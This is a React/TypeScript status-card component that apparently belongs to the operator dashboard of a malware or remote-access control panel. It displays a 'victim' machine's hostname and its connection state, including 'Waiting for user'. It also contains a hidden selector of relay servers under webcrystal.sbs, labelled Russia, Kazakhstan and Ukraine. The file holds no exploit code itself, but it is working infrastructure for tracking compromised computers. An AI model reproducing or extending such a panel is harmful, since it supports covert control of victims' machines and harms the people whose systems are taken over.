"use client";

import type { Victim } from "../../api/victims";

import { isVictimOnline } from "../utils/victim-status";

function getStatus(victim: Victim | null): "waiting" | "connected" | "disconnected" {
  if (!victim) return "waiting";

  const online = isVictimOnline(victim);
  return online ? "connected" : "disconnected";
}

export function DetailStatusCard(props: { victim: Victim | null }) {
  const { victim } = props;
  const status = getStatus(victim);

  const lineColor =
    status === "connected" ? "bg-[#4caf50]" : status === "disconnected" ? "bg-[#f44336]" : "bg-[#888]";

  const label = status === "connected" ? "Connected" : status === "disconnected" ? "Disconnected" : "Waiting for user";

  return (
    <div
      className={
        "mt-auto rounded-[14px] border border-[rgba(120,120,120,0.7)] bg-[rgba(32,32,36,0.9)] px-[8px] pb-[18px] pt-[12px] text-center " +
        "text-[15px] font-semibold text-[rgba(235,235,235,0.97)]"
      }
    >
      <div className="mb-[8px] text-[15px] font-semibold text-[rgba(235,235,235,0.95)]" id="detailStatusPc">
        {victim?.hostname ?? "-"}
      </div>
      <div className="mb-[8px] h-[2px] w-full bg-[var(--line)]" />
      <div className="mb-[4px]" id="detailStatusLabel">
        {label}
      </div>
      <div className={"mx-auto h-[3px] w-[85%] rounded-full opacity-85 animate-pulse " + lineColor} />

      <div className="mt-[10px] grid gap-[8px]">
        <button
          id="detailWsSettingsBtn"
          type="button"
          className={
            "flex h-[34px] w-full items-center justify-center gap-[8px] rounded-[12px] border border-[rgba(150,150,150,0.3)] " +
            "bg-[linear-gradient(180deg,rgba(38,38,46,0.92),rgba(18,18,24,0.92))] text-[rgba(240,240,240,0.92)] font-[650] " +
            "transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:border-[rgba(220,220,220,0.45)] hover:shadow-[0_10px_22px_rgba(0,0,0,0.45)] active:translate-y-[1px]"
          }
        >
          <span>Settings</span>
          <span
            id="detailWsSettingsValue"
            className="inline-flex items-center justify-center rounded-full border border-white/[0.14] bg-black/25 px-[8px] py-[2px] text-[12px] font-bold tracking-[0.02em]"
          >
            Default
          </span>
        </button>

        <select id="detailWsServerSelect" className="hidden">
          <option value="__default__">Default</option>
          <option value="ru.webcrystal.sbs">Russia</option>
          <option value="kz.webcrystal.sbs">Kazakhstan</option>
          <option value="ua.webcrystal.sbs">Ukraine</option>
        </select>
      </div>
    </div>
  );
}
